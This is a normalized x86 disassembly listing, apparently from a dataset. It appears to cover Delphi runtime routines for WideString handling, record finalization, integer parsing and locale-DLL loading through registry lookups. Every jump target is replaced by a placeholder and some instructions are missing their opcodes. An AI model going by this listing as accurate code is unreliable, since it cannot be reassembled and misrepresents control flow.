pop ebx
retn
mov eax esi
call sub_404170
mov [ edi ] eax
mov edx esi
mov cl bl
call sub_402cc4
sub_4047d0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4047f4
test edx edx
je sub_4047b8
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4047b8
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402848
retn
sub_404818
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4047b8
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404a00
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4041ec
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4041ec
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404a00
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4048a4
jmp r-xdata
sub_4048a4
test ecx ecx
je sub_4047b8
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402848
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_4048c8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4048a4
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404930
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4049b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404924
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_4048a4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404a00
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4047a8
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404790
mov ebx eax
mov eax [ edi ]
call sub_404924
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028e8
mov eax esi
sub_404a44
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a74
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404a74
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a74
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404a44
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402848
sub_404b08
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404b54
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404b54
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_4040d0
jmp r-xdata
call sub_4040ac
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4047d0
jmp r-xdata
call sub_4047b8
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404b3c
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404b54
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404b08
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405944
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_405298
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402848
sub_404c64
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028e8
mov edx [ eax + esi ]
add eax ebx
call sub_404100
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4047f4
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404c4c
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028e8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404d80
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404c64
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_40595c
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_4052d4
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402848
sub_404d80
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404100
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4047f4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404c4c
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404d80
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404c64
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40595c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_4052d4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402848
sub_404e7c
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404ea0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402a74
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402a74
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404e7c
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_405100
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4050f8
jmp r-xdata
mov al 0x4
call sub_402848
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402848
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40272c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026ec
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402cc4
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404b54
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028e8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402cc4
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_4050e0
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_405100
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_405298
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_40270c
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404b54
sub_4052d4
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_405298
pop edx
pop eax
sub_4052fc
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012fc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_40532c
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40128c
mov eax esp
mov dl 0x1
call sub_405568
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405374
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_40532c
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4053b0
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401294
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40129c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_40539c
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_40539c
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_40539c
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_40126c
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_401264
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405568
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40128c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012e4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40566d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4053b0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ec
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012e4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012dc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ec
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012e4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_4012ac
push eax
call sub_401284
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405808
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_40270c
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_40270c
jmp r-xdata
sub_405868
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4058a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_4058d4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405938
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405868
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40593f
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_40595c
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405988
test edx edx
je sub_405944
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402848
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
